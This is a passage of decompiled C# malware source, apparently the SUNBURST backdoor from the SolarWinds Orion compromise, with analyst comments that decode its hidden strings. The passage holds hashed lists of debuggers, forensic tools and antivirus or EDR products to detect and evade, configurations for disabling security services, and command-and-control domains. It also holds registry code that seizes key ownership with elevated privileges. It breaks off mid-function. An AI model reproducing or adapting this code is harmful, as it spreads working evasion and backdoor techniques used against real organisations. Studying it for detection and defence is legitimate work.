			// fakenet
			576626207276463000UL,
			// ffdec
			7412338704062093516UL,
			// fiddler
			682250828679635420UL,
			// fileinsight
			13014156621614176974UL,
			// floss
			18150909006539876521UL,
			// gdb
			10336842116636872171UL,
			// hiew32demo
			12785322942775634499UL,
			// hiew32
			13260224381505715848UL,
			// hollows_hunter
			17956969551821596225UL,
			// idaq64
			8709004393777297355UL,
			// idaq
			14256853800858727521UL,
			// idr
			8129411991672431889UL,
			// ildasm
			15997665423159927228UL,
			// ilspy
			10829648878147112121UL,
			// jd-gui
			9149947745824492274UL,
			// lordpe
			3656637464651387014UL,
			// officemalscanner
			3575761800716667678UL,
			// ollydbg
			4501656691368064027UL,
			// pdfstreamdumper
			10296494671777307979UL,
			// pe-bear
			14630721578341374856UL,
			// pebrowse64
			4088976323439621041UL,
			// peid
			9531326785919727076UL,
			// pe-sieve32
			6461429591783621719UL,
			// pe-sieve64
			6508141243778577344UL,
			// pestudio
			10235971842993272939UL,
			// peview
			2478231962306073784UL,
			// pexplorer
			9903758755917170407UL,
			// ppee
			14710585101020280896UL,
			// ppee
			14710585101020280896UL,
			// procdump64
			13611814135072561278UL,
			// procdump
			2810460305047003196UL,
			// processhacker
			2032008861530788751UL,
			// procexp64
			27407921587843457UL,
			// procexp
			6491986958834001955UL,
			// procmon
			2128122064571842954UL,
			// prodiscoverbasic
			10484659978517092504UL,
			// py2exedecompiler
			8478833628889826985UL,
			// r2agent
			10463926208560207521UL,
			// rabin2
			7080175711202577138UL,
			// radare2
			8697424601205169055UL,
			// ramcapture64
			7775177810774851294UL,
			// ramcapture
			16130138450758310172UL,
			// reflector
			506634811745884560UL,
			// regmon
			18294908219222222902UL,
			// resourcehacker
			3588624367609827560UL,
			// retdec-ar-extractor
			9555688264681862794UL,
			// retdec-bin2llvmir
			5415426428750045503UL,
			// retdec-bin2pat
			3642525650883269872UL,
			// retdec-config
			13135068273077306806UL,
			// retdec-fileinfo
			3769837838875367802UL,
			// retdec-getsig
			191060519014405309UL,
			// retdec-idr2pat
			1682585410644922036UL,
			// retdec-llvmir2hll
			7878537243757499832UL,
			// retdec-macho-extractor
			13799353263187722717UL,
			// retdec-pat2yara
			1367627386496056834UL,
			// retdec-stacofin
			12574535824074203265UL,
			// retdec-unpacker
			16990567851129491937UL,
			// retdec-yarac
			8994091295115840290UL,
			// rundotnetdll
			13876356431472225791UL,
			// sbiesvc
			14968320160131875803UL,
			// scdbg
			14868920869169964081UL,
			// scylla_x64
			106672141413120087UL,
			// scylla_x86
			79089792725215063UL,
			// shellcode_launcher
			5614586596107908838UL,
			// solarwindsdiagnostics
			3869935012404164040UL,
			// sysmon64
			3538022140597504361UL,
			// sysmon
			14111374107076822891UL,
			// task explorer
			7982848972385914508UL,
			// task explorer-64
			8760312338504300643UL,
			// tcpdump
			17351543633914244545UL,
			// tcpvcon
			7516148236133302073UL,
			// tcpview
			15114163911481793350UL,
			// vboxservice
			15457732070353984570UL,
			// win32_remote
			16292685861617888592UL,
			// win64_remotex64
			10374841591685794123UL,
			// windbg
			3045986759481489935UL,
			// windump
			17109238199226571972UL,
			// winhex64
			6827032273910657891UL,
			// winhex
			5945487981219695001UL,
			// winobj
			8052533790968282297UL,
			// wireshark
			17574002783607647274UL,
			// x32dbg
			3341747963119755850UL,
			// x64dbg
			14193859431895170587UL,
			// xwforensics64
			17439059603042731363UL,
			// xwforensics
			17683972236092287897UL,
			// redcloak
			700598796416086955UL,
			// avgsvc
			3660705254426876796UL,
			// avgui
			12709986806548166638UL,
			// avgsvca
			3890794756780010537UL,
			// avgidsagent
			2797129108883749491UL,
			// avgsvcx
			3890769468012566366UL,
			// avgwdsvcx
			14095938998438966337UL,
			// avgadminclientservice
			11109294216876344399UL,
			// afwserv
			1368907909245890092UL,
			// avastui
			11818825521849580123UL,
			// avastsvc
			8146185202538899243UL,
			// aswidsagent
			2934149816356927366UL,
			// aswidsagenta
			13029357933491444455UL,
			// aswengsrv
			6195833633417633900UL,
			// avastavwrapper
			2760663353550280147UL,
			// bccavsvc
			16423314183614230717UL,
			// psanhost
			2532538262737333146UL,
			// psuaservice
			4454255944391929578UL,
			// psuamain
			6088115528707848728UL,
			// avp
			13611051401579634621UL,
			// avpui
			18147627057830191163UL,
			// ksde
			17633734304611248415UL,
			// ksdeui
			13581776705111912829UL,
			// tanium
			7175363135479931834UL,
			// taniumclient
			3178468437029279937UL,
			// taniumdetectengine
			13599785766252827703UL,
			// taniumendpointindex
			6180361713414290679UL,
			// taniumtracecli
			8612208440357175863UL,
			// taniumtracewebsocketclient64
			8408095252303317471UL
		};

		// Token: 0x04000025 RID: 37
		private static readonly ulong[] configTimeStamps = new ulong[]
		{
			// cybkerneltracker.sys
			17097380490166623672UL,
			// atrsdfw.sys
			15194901817027173566UL,
			// eaw.sys
			12718416789200275332UL,
			// rvsavd.sys
			18392881921099771407UL,
			// dgdmk.sys
			3626142665768487764UL,
			// sentinelmonitor.sys
			12343334044036541897UL,
			// hexisfsmonitor.sys
			397780960855462669UL,
			// groundling32.sys
			6943102301517884811UL,
			// groundling64.sys
			13544031715334011032UL,
			// safe-agent.sys
			11801746708619571308UL,
			// crexecprev.sys
			18159703063075866524UL,
			// psepfilter.sys
			835151375515278827UL,
			// cve.sys
			16570804352575357627UL,
			// brfilter.sys
			1614465773938842903UL,
			// brcow_x_x_x_x.sys
			12679195163651834776UL,
			// lragentmf.sys
			2717025511528702475UL,
			// libwamf.sys
			17984632978012874803UL
		};

		// Token: 0x04000026 RID: 38
		private static readonly object svcListModifiedLock = new object();

		// Token: 0x04000027 RID: 39
		private static volatile bool _svcListModified1 = false;

		// Token: 0x04000028 RID: 40
		private static volatile bool _svcListModified2 = false;

		// Token: 0x04000029 RID: 41
		private static readonly Program.ServiceConfiguration[] svcList = new Program.ServiceConfiguration[]
		{
			new Program.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					// msmpeng
					5183687599225757871UL
				},
				Svc = new Program.ServiceConfiguration.Service[]
				{
					new Program.ServiceConfiguration.Service
					{
						// windefend
						timeStamp = 917638920165491138UL,
						started = true
					}
				}
			},
			new Program.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					// mssense
					10063651499895178962UL
				},
				Svc = new Program.ServiceConfiguration.Service[]
				{
					new Program.ServiceConfiguration.Service
					{
						// sense
						timeStamp = 16335643316870329598UL,
						started = true
					}
				}
			},
			new Program.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					// microsoft.tri.sensor
					10501212300031893463UL,
					// microsoft.tri.sensor.updater
					155978580751494388UL
				},
				Svc = new Program.ServiceConfiguration.Service[0]
			},
			new Program.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					// cavp
					17204844226884380288UL,
					// cb
					5984963105389676759UL
				},
				Svc = new Program.ServiceConfiguration.Service[]
				{
					new Program.ServiceConfiguration.Service
					{
						// carbonblack
						timeStamp = 11385275378891906608UL,
						DefaultValue = 2U
					},
					new Program.ServiceConfiguration.Service
					{
						// carbonblackk
						timeStamp = 13693525876560827283UL,
						DefaultValue = 1U
					},
					new Program.ServiceConfiguration.Service
					{
						// cbcomms
						timeStamp = 17849680105131524334UL,
						DefaultValue = 1U
					},
					new Program.ServiceConfiguration.Service
					{
						// cbstream
						timeStamp = 18246404330670877335UL,
						DefaultValue = 3U
					}
				}
			},
			new Program.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					// csfalconservice
					8698326794961817906UL,
					// csfalconcontainer
					9061219083560670602UL
				},
				Svc = new Program.ServiceConfiguration.Service[]
				{
					new Program.ServiceConfiguration.Service
					{
						// csagent
						timeStamp = 11771945869106552231UL,
						DefaultValue = 1U
					},
					new Program.ServiceConfiguration.Service
					{
						// csdevicecontrol
						timeStamp = 9234894663364701749UL,
						DefaultValue = 3U
					},
					new Program.ServiceConfiguration.Service
					{
						// csfalconservice
						timeStamp = 8698326794961817906UL,
						DefaultValue = 2U
					}
				}
			},
			new Program.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					// xagt
					15695338751700748390UL,
					// xagtnotif
					640589622539783622UL
				},
				Svc = new Program.ServiceConfiguration.Service[]
				{
					new Program.ServiceConfiguration.Service
					{
						// xagt
						timeStamp = 15695338751700748390UL,
						DefaultValue = 2U
					},
					new Program.ServiceConfiguration.Service
					{
						// fe_avk
						timeStamp = 9384605490088500348UL,
						DefaultValue = 3U
					},
					new Program.ServiceConfiguration.Service
					{
						// fekern
						timeStamp = 6274014997237900919UL,
						DefaultValue = 3U
					},
					new Program.ServiceConfiguration.Service
					{
						// feelam
						timeStamp = 15092207615430402812UL,
						DefaultValue = 0U
					},
					new Program.ServiceConfiguration.Service
					{
						// fewscservice
						timeStamp = 3320767229281015341UL,
						DefaultValue = 3U
					}
				}
			},
			new Program.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					// ekrn
					3200333496547938354UL,
					// eguiproxy
					14513577387099045298UL,
					// egui
					607197993339007484UL
				},
				Svc = new Program.ServiceConfiguration.Service[]
				{
					new Program.ServiceConfiguration.Service
					{
						// eamonm
						timeStamp = 15587050164583443069UL,
						DefaultValue = 1U
					},
					new Program.ServiceConfiguration.Service
					{
						// eelam
						timeStamp = 9559632696372799208UL,
						DefaultValue = 0U
					},
					new Program.ServiceConfiguration.Service
					{
						// ehdrv
						timeStamp = 4931721628717906635UL,
						DefaultValue = 1U
					},
					new Program.ServiceConfiguration.Service
					{
						// ekrn
						timeStamp = 3200333496547938354UL,
						DefaultValue = 2U
					},
					new Program.ServiceConfiguration.Service
					{
						// ekrnepfw
						timeStamp = 2589926981877829912UL,
						DefaultValue = 3U
					},
					new Program.ServiceConfiguration.Service
					{
						// epfwwfp
						timeStamp = 17997967489723066537UL,
						DefaultValue = 1U
					},
					new Program.ServiceConfiguration.Service
					{
						// ekbdflt
						timeStamp = 14079676299181301772UL,
						DefaultValue = 2U
					},
					new Program.ServiceConfiguration.Service
					{
						// epfw
						timeStamp = 17939405613729073960UL,
						DefaultValue = 1U
					}
				}
			},
			new Program.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					// fsgk32st
					521157249538507889UL,
					// fswebuid
					14971809093655817917UL,
					// fsgk32
					10545868833523019926UL,
					// fsma32
					15039834196857999838UL,
					// fssm32
					14055243717250701608UL,
					// fnrb32
					5587557070429522647UL,
					// fsaua
					12445177985737237804UL,
					// fsorsp
					17978774977754553159UL,
					// fsav32
					17017923349298346219UL
				},
				Svc = new Program.ServiceConfiguration.Service[]
				{
					new Program.ServiceConfiguration.Service
					{
						// f-secure gatekeeper handler starter
						timeStamp = 17624147599670377042UL,
						DefaultValue = 2U
					},
					new Program.ServiceConfiguration.Service
					{
						// f-secure network request broker
						timeStamp = 16066651430762394116UL,
						DefaultValue = 3U
					},
					new Program.ServiceConfiguration.Service
					{
						// f-secure webui daemon
						timeStamp = 13655261125244647696UL,
						DefaultValue = 2U
					},
					new Program.ServiceConfiguration.Service
					{
						// fsaua
						timeStamp = 12445177985737237804UL,
						DefaultValue = 3U
					},
					new Program.ServiceConfiguration.Service
					{
						// fsma
						timeStamp = 3421213182954201407UL,
						DefaultValue = 2U
					},
					new Program.ServiceConfiguration.Service
					{
						// fsorspclient
						timeStamp = 14243671177281069512UL,
						DefaultValue = 3U
					},
					new Program.ServiceConfiguration.Service
					{
						// f-secure gatekeeper
						timeStamp = 16112751343173365533UL,
						DefaultValue = 3U
					},
					new Program.ServiceConfiguration.Service
					{
						// f-secure hips
						timeStamp = 3425260965299690882UL,
						DefaultValue = 1U
					},
					new Program.ServiceConfiguration.Service
					{
						// fsbts
						timeStamp = 9333057603143916814UL,
						DefaultValue = 0U
					},
					new Program.ServiceConfiguration.Service
					{
						// fsni
						timeStamp = 3413886037471417852UL,
						DefaultValue = 3U
					},
					new Program.ServiceConfiguration.Service
					{
						// fsvista
						timeStamp = 7315838824213522000UL,
						DefaultValue = 1U
					},
					new Program.ServiceConfiguration.Service
					{
						// f-secure filter
						timeStamp = 13783346438774742614UL,
						DefaultValue = 4U
					},
					new Program.ServiceConfiguration.Service
					{
						// f-secure recognizer
						timeStamp = 2380224015317016190UL,
						DefaultValue = 4U
					},
					new Program.ServiceConfiguration.Service
					{
						// fses
						timeStamp = 3413052607651207697UL,
						DefaultValue = 1U
					},
					new Program.ServiceConfiguration.Service
					{
						// fsfw
						timeStamp = 3407972863931386250UL,
						DefaultValue = 1U
					},
					new Program.ServiceConfiguration.Service
					{
						// fsdfw
						timeStamp = 10393903804869831898UL,
						DefaultValue = 3U
					},
					new Program.ServiceConfiguration.Service
					{
						// fsaus
						timeStamp = 12445232961318634374UL,
						DefaultValue = 2U
					},
					new Program.ServiceConfiguration.Service
					{
						// fsms
						timeStamp = 3421197789791424393UL,
						DefaultValue = 2U
					},
					new Program.ServiceConfiguration.Service
					{
						// fsdevcon
						timeStamp = 541172992193764396UL,
						DefaultValue = 2U
					}
				}
			}
		};

		// Token: 0x0400002A RID: 42
		private static readonly Program.IPAddressesHelper[] nList = new Program.IPAddressesHelper[]
		{
			// 10.0.0.0
			// 255.0.0.0
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("MzTQA0MA"), Program.ZipHelper.Unzip("MzI11TMAQQA="), Program.AddressFamilyEx.Atm),
			// 172.16.0.0
			// 255.240.0.0
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("MzQ30jM00zPQMwAA"), Program.ZipHelper.Unzip("MzI11TMyMdADQgA="), Program.AddressFamilyEx.Atm),
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("M7Q00jM0s9Az0DMAAA=="), Program.ZipHelper.Unzip("MzI11TMCYgM9AwA="), Program.AddressFamilyEx.Atm),
			// 224.0.0.0
			// 240.0.0.0
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("MzIy0TMAQQA="), Program.ZipHelper.Unzip("MzIx0ANDAA=="), Program.AddressFamilyEx.Atm),
			// fc00::
			// fe00::
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("S0s2MLCyAgA="), Program.ZipHelper.Unzip("S0s1MLCyAgA="), Program.AddressFamilyEx.Atm),
			// fec0::
			// S0tLNrCyAgA=
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("S0tNNrCyAgA="), Program.ZipHelper.Unzip("S0tLNrCyAgA="), Program.AddressFamilyEx.Atm),
			// ff00::
			// S0szMLCyAgA=
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("S0szMLCyAgA="), Program.ZipHelper.Unzip("S0szMLCyAgA="), Program.AddressFamilyEx.Atm),
			// 41.84.159.0
			// 255.255.255.0
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("MzHUszDRMzS11DMAAA=="), Program.ZipHelper.Unzip("MzI11TOCYgMA"), Program.AddressFamilyEx.Ipx),
			// 74.114.24.0
			// 255.255.248.0
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("MzfRMzQ00TMy0TMAAA=="), Program.ZipHelper.Unzip("MzI11TMCYRMLPQMA"), Program.AddressFamilyEx.Ipx),
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("MzQ10TM0tNAzNDHQMwAA"), Program.ZipHelper.Unzip("MzI11TOCYgMA"), Program.AddressFamilyEx.Ipx),
			// 217.163.7.0
			// 255.255.255.0
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("MzI01zM0M9Yz1zMAAA=="), Program.ZipHelper.Unzip("MzI11TOCYgMA"), Program.AddressFamilyEx.Ipx),
			// 20.140.0.0
			// 255.254.0.0
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("MzLQMzQx0ANCAA=="), Program.ZipHelper.Unzip("MzI11TMyNdEz0DMAAA=="), Program.AddressFamilyEx.ImpLink),
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("szTTMzbUMzQ30jMAAA=="), Program.ZipHelper.Unzip("MzI11TOCYgMA"), Program.AddressFamilyEx.ImpLink),
			// 131.228.12.0
			// 255.255.252.0
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("MzQ21DMystAzNNIzAAA="), Program.ZipHelper.Unzip("MzI11TMCYyM9AwA="), Program.AddressFamilyEx.ImpLink),
			// 144.86.226.0
			// 255.255.255.0
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("MzQx0bMw0zMyMtMzAAA="), Program.ZipHelper.Unzip("MzI11TOCYgMA"), Program.AddressFamilyEx.ImpLink),
			// 8.18.144.0
			// 255.255.254.0
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("s9AztNAzNDHRMwAA"), Program.ZipHelper.Unzip("MzI11TMCYxM9AwA="), Program.AddressFamilyEx.NetBios),
		
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("M7TQMzQ20ANCAA=="), Program.ZipHelper.Unzip("MzI11TMCYgM9AwA="), Program.AddressFamilyEx.NetBios, true),
			// 71.152.53.0
			// 255.255.255.0
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("MzfUMzQ10jM11jMAAA=="), Program.ZipHelper.Unzip("MzI11TOCYgMA"), Program.AddressFamilyEx.NetBios),
			// 99.79.0.0
			// 255.255.0.0
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("s7TUM7fUM9AzAAA="), Program.ZipHelper.Unzip("MzI11TMCYgM9AwA="), Program.AddressFamilyEx.NetBios, true),
			// 87.238.80.0
			// 255.255.248.0
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("szDXMzK20LMw0DMAAA=="), Program.ZipHelper.Unzip("MzI11TMCYRMLPQMA"), Program.AddressFamilyEx.NetBios),
			// 199.201.117.0
			// 255.255.255.0
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("M7S01DMyMNQzNDTXMwAA"), Program.ZipHelper.Unzip("MzI11TOCYgMA"), Program.AddressFamilyEx.NetBios),
			// F.0.0
			// 255.254.0.0
			new Program.IPAddressesHelper(Program.ZipHelper.Unzip("M7Qw0TM30jPQMwAA"), Program.ZipHelper.Unzip("MzI11TMyNdEz0DMAAA=="), Program.AddressFamilyEx.NetBios, true)
		};

		// Token: 0x0400002B RID: 43
		private static readonly ulong[] patternHashes = new ulong[]
		{
			// swdev.local
			1109067043404435916UL,
			// swdev.dmz
			15267980678929160412UL,
			// lab.local
			8381292265993977266UL,
			// lab.na
			3796405623695665524UL,
			// emea.sales
			8727477769544302060UL,
			// cork.lab
			10734127004244879770UL,
			// dev.local
			11073283311104541690UL,
			// dmz.local
			4030236413975199654UL,
			// pci.local
			7701683279824397773UL,
			// saas.swi
			5132256620104998637UL,
			// lab.rio
			5942282052525294911UL,
			// lab.brno
			4578480846255629462UL,
			// apac.lab
			16858955978146406642UL
		};

		// Token: 0x0400002C RID: 44
		private static readonly string[] patternList = new string[]
		{
			// (?i)([^a-z]|^)(test)([^a-z]|$)
			Program.ZipHelper.Unzip("07DP1NSIjkvUrYqtidPUKEktLoHzVTQB"),
			// (?i)(solarwinds)
			Program.ZipHelper.Unzip("07DP1NQozs9JLCrPzEsp1gQA")
		};

		// Token: 0x0400002D RID: 45
		// ReportWatcherRetry
		private static readonly string reportStatusName = Program.ZipHelper.Unzip("C0otyC8qCU8sSc5ILQpKLSmqBAA=");

		// Token: 0x0400002E RID: 46
		// ReportWatcherPostpone 
		private static readonly string serviceStatusName = Program.ZipHelper.Unzip("C0otyC8qCU8sSc5ILQrILy4pyM9LBQA=");

		// Token: 0x0400002F RID: 47
		private static string userAgentOrionImprovementClient = null;

		// Token: 0x04000030 RID: 48
		private static string userAgentDefault = null;

		// Token: 0x04000031 RID: 49
		// api.solarwinds.com
		private static readonly string apiHost = Program.ZipHelper.Unzip("SyzI1CvOz0ksKs/MSynWS87PBQA=");

		// Token: 0x04000032 RID: 50
		// avsvmcloud.com
		private static readonly string domain1 = Program.ZipHelper.Unzip("SywrLstNzskvTdFLzs8FAA==");

		// Token: 0x04000033 RID: 51
		// appsync-api
		private static readonly string domain2 = Program.ZipHelper.Unzip("SywoKK7MS9ZNLMgEAA==");

		// Token: 0x04000034 RID: 52
		private static readonly string[] domain3 = new string[]
		{
			// eu-west-1
			Program.ZipHelper.Unzip("Sy3VLU8tLtE1BAA="),
			// us-west-2
			Program.ZipHelper.Unzip("Ky3WLU8tLtE1AgA="),
			// us-east-1
			Program.ZipHelper.Unzip("Ky3WTU0sLtE1BAA="),
			// us-east-2
			Program.ZipHelper.Unzip("Ky3WTU0sLtE1AgA=")
		};

		// Token: 0x04000035 RID: 53
		// 583da945-62af-10e8-4902-a8f205c72b2e
		private static readonly string appId = Program.ZipHelper.Unzip("M7UwTkm0NDHVNTNKTNM1NEi10DWxNDDSTbRIMzIwTTY3SjJKBQA=");
		
		// Token: 0x04000036 RID: 54
		private static Program.ReportStatus status = Program.ReportStatus.New;

		// Token: 0x04000037 RID: 55
		private static string domain4 = null;

		// Token: 0x04000038 RID: 56
		private static byte[] userId = null;

		// Token: 0x04000039 RID: 57
		private static NamedPipeServerStream instance = null;

		// Token: 0x0400003A RID: 58
		private const int minInterval = 30;

		// Token: 0x0400003B RID: 59
		private const int maxInterval = 120;

		// Token: 0x0400003C RID: 60
		private static string osVersion = null;

		// Token: 0x0400003D RID: 61
		private static string osInfo = null;

		// Token: 0x020000CB RID: 203
		private enum ReportStatus
		{
			// Token: 0x040002D3 RID: 723
			New,
			// Token: 0x040002D4 RID: 724
			Append,
			// Token: 0x040002D5 RID: 725
			Truncate
		}

		// Token: 0x020000CC RID: 204
		private enum AddressFamilyEx
		{
			// Token: 0x040002D7 RID: 727
			NetBios,
			// Token: 0x040002D8 RID: 728
			ImpLink,
			// Token: 0x040002D9 RID: 729
			Ipx,
			// Token: 0x040002DA RID: 730
			InterNetwork,
			// Token: 0x040002DB RID: 731
			InterNetworkV6,
			// Token: 0x040002DC RID: 732
			Unknown,
			// Token: 0x040002DD RID: 733
			Atm,
			// Token: 0x040002DE RID: 734
			Error
		}

		// Token: 0x020000CD RID: 205
		private enum HttpOipMethods
		{
			// Token: 0x040002E0 RID: 736
			Get,
			// Token: 0x040002E1 RID: 737
			Head,
			// Token: 0x040002E2 RID: 738
			Put,
			// Token: 0x040002E3 RID: 739
			Post
		}

		// Token: 0x020000CE RID: 206
		private enum ProxyType
		{
			// Token: 0x040002E5 RID: 741
			Manual,
			// Token: 0x040002E6 RID: 742
			System,
			// Token: 0x040002E7 RID: 743
			Direct,
			// Token: 0x040002E8 RID: 744
			Default
		}

		// Token: 0x020000CF RID: 207
		private static class RegistryHelper
		{
			// Token: 0x06000966 RID: 2406 RVA: 0x00042A60 File Offset: 0x00040C60
			private static RegistryHive GetHive(string key, out string subKey)
			{
				string[] array = key.Split(new char[]
				{
					'\\'
				}, 2);
				string a = array[0].ToUpper();
				subKey = ((array.Length <= 1) ? "" : array[1]);
				// HKEY_CLASSES_ROOT
				// HKCR
				if (a == Program.ZipHelper.Unzip("8/B2jYx39nEMDnYNjg/y9w8BAA==") || a == Program.ZipHelper.Unzip("8/B2DgIA"))
				{
					return RegistryHive.ClassesRoot;
				}
				// HKEY_CURRENT_USER
				// HKCU
				if (a == Program.ZipHelper.Unzip("8/B2jYx3Dg0KcvULiQ8Ndg0CAA==") || a == Program.ZipHelper.Unzip("8/B2DgUA"))
				{
					return RegistryHive.CurrentUser;
				}
				// HKEY_LOCAL_MACHINE
				// HKLM
				if (a == Program.ZipHelper.Unzip("8/B2jYz38Xd29In3dXT28PRzBQA=") || a == Program.ZipHelper.Unzip("8/D28QUA"))
				{
					return RegistryHive.LocalMachine;
				}
				// HKEY_USERS
				// HKU
				if (a == Program.ZipHelper.Unzip("8/B2jYwPDXYNCgYA") || a == Program.ZipHelper.Unzip("8/AOBQA="))
				{
					return RegistryHive.Users;
				}
				// HKEY_CURRENT_CONFIG
				// HKCC
				if (a == Program.ZipHelper.Unzip("8/B2jYx3Dg0KcvULiXf293PzdAcA") || a == Program.ZipHelper.Unzip("8/B2dgYA"))
				{
					return RegistryHive.CurrentConfig;
				}
				// HKEY_PERFOMANCE_DATA
				// HKPD
				if (a == Program.ZipHelper.Unzip("8/B2jYwPcA1y8/d19HN2jXdxDHEEAA==") || a == Program.ZipHelper.Unzip("8/AOcAEA"))
				{
					return RegistryHive.PerformanceData;
				}
				// HKEY_DYN_DATA
				// HKDD
				if (a == Program.ZipHelper.Unzip("8/B2jYx3ifSLd3EMcQQA") || a == Program.ZipHelper.Unzip("8/B2cQEA"))
				{
					return RegistryHive.DynData;
				}
				return (RegistryHive)0;
			}

			// Token: 0x06000967 RID: 2407 RVA: 0x00042BC4 File Offset: 0x00040DC4
			public static bool SetValue(string key, string valueName, string valueData, RegistryValueKind valueKind)
			{
				string name;
				bool result;
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(Program.RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name, true))
					{
						switch (valueKind)
						{
							case RegistryValueKind.String:
							case RegistryValueKind.ExpandString:
							case RegistryValueKind.DWord:
							case RegistryValueKind.QWord:
								registryKey2.SetValue(valueName, valueData, valueKind);
								goto IL_98;
							case RegistryValueKind.Binary:
								registryKey2.SetValue(valueName, Program.HexStringToByteArray(valueData), valueKind);
								goto IL_98;
							case RegistryValueKind.MultiString:
								registryKey2.SetValue(valueName, valueData.Split(new string[]
								{
								"\r\n",
								"\n"
								}, StringSplitOptions.None), valueKind);
								goto IL_98;
						}
						return false;
					IL_98:
						result = true;
					}
				}
				return result;
			}

			// Token: 0x06000968 RID: 2408 RVA: 0x00042CA0 File Offset: 0x00040EA0
			public static string GetValue(string key, string valueName, object defaultValue)
			{
				string name;
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(Program.RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
					{
						object value = registryKey2.GetValue(valueName, defaultValue);
						if (value != null)
						{
							if (value.GetType() == typeof(byte[]))
							{
								return Program.ByteArrayToHexString((byte[])value);
							}
							if (value.GetType() == typeof(string[]))
							{
								return string.Join("\n", (string[])value);
							}
							return value.ToString();
						}
					}
				}
				return null;
			}

			// Token: 0x06000969 RID: 2409 RVA: 0x00042D68 File Offset: 0x00040F68
			public static void DeleteValue(string key, string valueName)
			{
				string name;
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(Program.RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name, true))
					{
						registryKey2.DeleteValue(valueName, true);
					}
				}
			}

			// Token: 0x0600096A RID: 2410 RVA: 0x00042DCC File Offset: 0x00040FCC
			public static string GetSubKeyAndValueNames(string key)
			{
				string name;
				string result;
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(Program.RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
					{
						result = string.Join("\n", registryKey2.GetSubKeyNames()) + "\n\n" + string.Join(" \n", registryKey2.GetValueNames());
					}
				}
				return result;
			}

			// Token: 0x0600096B RID: 2411 RVA: 0x00042E54 File Offset: 0x00041054
			private static string GetNewOwnerName()
			{
				string text = null;
				// S-1-5-
				string value = Program.ZipHelper.Unzip("C9Y11DXVBQA=");
				// -500
				string value2 = Program.ZipHelper.Unzip("0zU1MAAA");
				try
				{
					// Administrator
					text = new NTAccount(Program.ZipHelper.Unzip("c0zJzczLLC4pSizJLwIA")).Translate(typeof(SecurityIdentifier)).Value;
				}
				catch
				{
				}
				if (string.IsNullOrEmpty(text) || !text.StartsWith(value, StringComparison.OrdinalIgnoreCase) || !text.EndsWith(value2, StringComparison.OrdinalIgnoreCase))
				{
					// Select * From Win32_UserAccount
					string queryString = Program.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPLU4tckxOzi/NKwEA");
					text = null;
					using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString))
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
						{
							// SID
							ManagementObject managementObject = (ManagementObject)managementBaseObject;
							string text2 = managementObject.Properties[Program.ZipHelper.Unzip("C/Z0AQA=")].Value.ToString();
							// LocalAccount
							// true
							if (managementObject.Properties[Program.ZipHelper.Unzip("88lPTsxxTE7OL80rAQA=")].Value.ToString().ToLower() == Program.ZipHelper.Unzip("KykqTQUA") && text2.StartsWith(value, StringComparison.OrdinalIgnoreCase))
							{
								if (text2.EndsWith(value2, StringComparison.OrdinalIgnoreCase))
								{
									text = text2;
									break;
								}
								if (string.IsNullOrEmpty(text))
								{
									text = text2;
								}
							}
						}
					}
				}
				return new SecurityIdentifier(text).Translate(typeof(NTAccount)).Value;
			}

			// Token: 0x0600096C RID: 2412 RVA: 0x00042FD4 File Offset: 0x000411D4
			private static void SetKeyOwner(RegistryKey key, string subKey, string owner)
			{
				using (RegistryKey registryKey = key.OpenSubKey(subKey, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership))
				{
					RegistrySecurity registrySecurity = new RegistrySecurity();
					registrySecurity.SetOwner(new NTAccount(owner));
					registryKey.SetAccessControl(registrySecurity);
				}
			}

			// Token: 0x0600096D RID: 2413 RVA: 0x00043024 File Offset: 0x00041224
			private static void SetKeyOwnerWithPrivileges(RegistryKey key, string subKey, string owner)
			{
				try
				{
					Program.RegistryHelper.SetKeyOwner(key, subKey, owner);
				}
				catch
				{
					bool newState = false;
					bool newState2 = false;
					bool flag = false;
					bool flag2 = false;
					// SeRestorePrivilege
					string privilege = Program.ZipHelper.Unzip("C04NSi0uyS9KDSjKLMvMSU1PBQA=");
					// SeTakeOwnershipPrivilege
					string privilege2 = Program.ZipHelper.Unzip("C04NScxO9S/PSy0qzsgsCCjKLMvMSU1PBQA=");
